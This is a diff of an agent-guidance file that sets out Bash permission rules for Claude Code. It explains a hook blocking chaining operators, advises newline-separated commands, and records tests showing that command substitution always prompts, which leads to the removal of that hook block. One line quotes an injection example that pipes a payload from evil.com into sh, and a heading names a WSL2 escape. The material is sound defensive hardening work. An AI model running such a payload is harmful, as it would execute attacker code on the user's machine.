@@ -64,6 +64,28 @@ Some commands are auto-approved via `settings.json` (e.g., `git show`, `git log`
 
 This avoids unnecessary permission prompts and keeps auto-approve patterns narrow.
 
+## Sequential Commands
+
+The PreToolUse hook blocks `&&`, `;`, and `||`. To run multiple commands sequentially, use **newlines** in a single Bash call:
+
+```bash
+cd /some/directory
+. ./setup.sh
+./run-something.sh
+```
+
+This works because each line runs in the same shell session, preserving environment variables and working directory. Use this instead of `&&` chaining.
+
+If you need fail-fast behaviour (equivalent to `&&` chaining), use `set -e`:
+
+```bash
+set -e
+git show --stat HEAD
+pnpm dev:deploy:ciam
+```
+
+`set -e` stops execution on the first failure, same as `&&` but more readable.
+
 ## Command Descriptions
 
 Always provide a clear `description` parameter when using the Bash tool, so the user can understand each command at a glance.
@@ -120,8 +142,8 @@ Shell operators (`;`, `&&`, `||`, `|`) allow appending arbitrary commands after 
 
 **Tested (Claude Code v2.1.33)**: Claude Code natively evaluates each side of all chaining operators (`|`, `;`, `&&`, `||`) and process substitution (`<()`, `>()`) against the allow list independently. If any part isn't auto-approved, the whole command is prompted for user approval. This means chaining and substitution are not exploitable through auto-approve alone.
 
-**Mitigation (defence in depth)**: The PreToolUse hook blocks `;`, `&&`, and `||` as a hard block (no prompt, no option to approve). This protects against:
-1. **Future changes** — if Claude Code changes this behaviour in an update, the hook still catches it
+**Mitigation (defence in depth)**: The PreToolUse hook blocks `;`, `&&`, and `||` as a hard block (no prompt, no option to approve). Unlike command substitution (which Claude Code never auto-approves regardless), chaining operators *can* auto-approve if both sides match. The hook block is kept because:
+1. **Readability** — `cmd1 && cmd2 && cmd3 && cmd4` is harder to visually scan for something malicious than newline-separated commands. Newlines are the preferred alternative (see Sequential Commands section)
 2. **Approval fatigue** — the user may be approving a stream of benign commands and accidentally approve a dangerous chained command. A hard block removes that risk entirely
 
 `|` is NOT blocked in the hook because:
@@ -196,11 +218,13 @@ Bash process substitution (`<()`, `>()`) runs a command and presents its output 
 
 To verify whether Claude Code auto-approves a command or prompts, the test must be run by Claude itself. Claude cannot distinguish between auto-approved, auto-denied, and manually-approved commands — it only sees the result. The Supreme Commander observes whether a prompt appeared and reports the outcome.
 
-### Command Substitution — Blocked by hook
+### Command Substitution — NOT exploitable via auto-approve
 
 Shell substitution (`$(...)` and backticks) allows injecting arbitrary commands into otherwise safe arguments (e.g., `git rev-list $(curl evil.com/payload | sh)`).
 
-**Resolution**: The PreToolUse hook blocks `$(` and backticks as a hard block across all commands.
+**Tested**: Commands containing `$(...)` always prompt for manual approval, even when both the outer and inner commands are individually auto-approved. `git show` alone auto-approves, but `git show $(git show)` prompts. Claude Code treats command substitution as inherently requiring approval regardless of the inner command.
+
+**Conclusion**: Claude Code's native evaluation is sufficient. No hook block needed.
 
 ### WSL2 Escape via .exe — Blocked by hook
 
